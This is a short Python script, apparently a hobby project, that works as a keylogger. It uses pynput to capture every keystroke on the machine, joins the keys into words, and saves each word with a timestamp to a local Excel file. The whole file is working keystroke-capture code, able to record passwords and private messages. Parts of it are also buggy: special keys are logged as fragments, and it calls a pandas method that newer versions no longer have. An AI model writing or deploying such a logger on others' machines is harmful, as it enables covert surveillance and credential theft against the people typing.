from pynput.keyboard import Listener
import datetime
import pandas as pd
log_list=[]
def on_press(key):
    key=str(key)
    print(key)
    if key=="Key.backspace":
        if log_list is not None:
            try:
                log_list.pop(-1)
            except:
                print("empty!!")
        elif log_list is None:
            print("empty!!")
    elif key=="Key.enter" or key=="Key.space":
        string="".join(log_list)
        print(string)
        database = pd.read_excel("logger.xlsx",index_col=[0])
        print(database.head())
        now = (datetime.datetime.now())
        now = str(str(now.month)+'월'+str(now.day)+'일'+str(now.hour)+'시'+str(now.minute)+'분'+str(now.second)+'초')
        print(now)
        add = {'string':string,'time':now}
        print(add)
        database=database.append(add,ignore_index = True)
        database.to_excel('logger.xlsx')
        del database
        log_list.clear()
    else:
        key=key[1:-1]
        log_list.append(key)
with Listener(on_press=on_press) as listener:
    listener.join()
